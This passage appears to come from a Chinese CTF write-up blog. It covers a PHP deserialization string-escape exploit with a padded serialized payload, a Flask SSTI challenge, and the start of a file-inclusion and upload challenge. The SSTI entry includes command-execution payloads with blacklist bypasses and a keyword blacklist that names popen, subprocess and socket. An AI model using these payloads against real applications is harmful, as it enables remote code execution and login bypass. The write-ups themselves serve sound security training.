        <span class="token variable">$upDate</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">dbCtrl</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$database</span><span class="token operator">=</span><span class="token string">"test"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hostname</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dbuser</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dbpass</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"连接失败，错误:"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$idResult</span><span class="token punctuation">,</span> <span class="token variable">$passwordResult</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span><span class="token operator">==</span><span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$idResult</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'用户不存在!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token variable">$passwordResult</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'密码错误！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">//还没来得及写</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">User</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token string">'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Info</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">CtrlCase</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">UpdateHelper</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">dbCtrl</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<pre><code>";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}</code></pre>
<pre><code>age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}</code></pre>
]]></content>
      <tags>
        <tag>反序列化字符串逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF:2020-FlaskAPP</title>
    <url>/2021/07/18/gyctf-2020-flaskapp/</url>
    <content><![CDATA[<p>在text_decode = base64.b64decode(text.encode())处的报错读取到部分源码:</p>
<p><img src="/2021/07/18/gyctf-2020-flaskapp/image-20210719015136254.png" alt="1"></p>
<pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/decode'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>
        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>
        text_decode <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        tmp <span class="token operator">=</span> <span class="token string">"结果 ： {0}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>text_decode<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">"no no no !!"</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        res <span class="token operator">=</span>  render_template_string<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span></code></pre>
<p>ssti注入</p>
<p><img src="/2021/07/18/gyctf-2020-flaskapp/image-20210719015737157.png" alt="2"></p>
<p><img src="/2021/07/18/gyctf-2020-flaskapp/image-20210719015715188.png" alt="3"></p>
<p>查看根目录：</p>
<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}</code></pre>
<p>nonono</p>
<p>读源码：</p>
<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{% endif %}{% endfor %}</code></pre>
<p><img src="/2021/07/18/gyctf-2020-flaskapp/image-20210719020025146.png" alt="4"></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;,</span>
                  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> black_list <span class="token punctuation">:</span>
        <span class="token keyword">if</span> x <span class="token keyword">in</span> str<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">1</span></code></pre>
<p>黑名单过滤了这些函数</p>
<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}</code></pre>
<p>['bin', 'boot', 'dev',  'etc', 'home', 'lib',  'lib64', 'media', 'mnt', 'opt', 'proc', 'root',  'run', 'sbin', 'srv',  'sys', 'tmp', 'usr',  'var', 'this_is_the_flag.txt',  '.dockerenv', 'app']</p>
<p><strong>this_is_the_flag.txt</strong></p>
<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}</code></pre>
<p><img src="/2021/07/18/gyctf-2020-flaskapp/image-20210719020512644.png" alt="5"></p>
]]></content>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>HBCTF：2017-大美西安</title>
    <url>/2021/09/09/hbctf-2017-da-mei-xi-an/</url>
    <content><![CDATA[<p>注册登录：</p>
<p><img src="/2021/09/09/hbctf-2017-da-mei-xi-an/image-20210909130939024.png" alt="image-20210909130939024"></p>
<p>收藏保存双写绕过</p>
<p><img src="/2021/09/09/hbctf-2017-da-mei-xi-an/image-20210909133350048.png" alt="image-20210909133350048"></p>
<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>


<span class="token variable">$file</span>  <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">"home"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// echo $file;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\.\.|^[\s]*\/|^[\s]*php:|filter/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
       <span class="token keyword">echo</span> "<span class="token markup">&lt;div class=\"msg error\" id=\"message\"></span>
        <span class="token markup">&lt;i class=\"fa fa-exclamation-triangle\"></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span></span>Attack Detected<span class="token operator">!</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?file=login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p>index.php中有一行<code>$filename = $file.".php";</code>可以包含用伪协议getshell。<br> 比如phar:// zip://<br> 恰好这题有个文件上传功能。改后缀名就可以了。然后配合getshell</p>
<h5 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 

<span class="token shell-comment comment">#defined(</span><span class="token string">"DIR_PERMITION"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Access denied!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php?file=login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">getrandmax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> "<span class="token markup">&lt;div class=\"msg error\" id=\"message\"></span>
        <span class="token markup">&lt;i class=\"fa fa-exclamation-triangle\"></span>uplpad file error<span class="token operator">!</span><span class="token punctuation">:</span><span class="token string">".$_FILES["</span>file<span class="token string">"]["</span>error<span class="token string">"]."</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$fileTypeCheck</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/pjpeg"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$reg</span><span class="token operator">=</span><span class="token string">'/^gif|jpg|jpeg|png$/'</span><span class="token punctuation">;</span>
    <span class="token variable">$fileExtensionCheck</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fileExtensionCheck</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Only upload image file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fileTypeCheck</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

        <span class="token variable">$fileOldName</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_FILENAME</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$fileNewName</span> <span class="token operator">=</span> <span class="token string">'./Up10aDs/'</span> <span class="token punctuation">.</span> <span class="token function">random_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$userid</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$sql</span><span class="token operator">=</span> <span class="token string">"insert into `download` (`uid`,`image_name`,`location`) values ($userid,'$fileOldName','$fileNewName')"</span><span class="token punctuation">;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$conn</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">&amp;&amp;</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$fileNewName</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
         <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('file upload success!');window.location.href='index.php?file=home'&lt;/script>"</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
             <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('file upload error')&lt;/script>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>

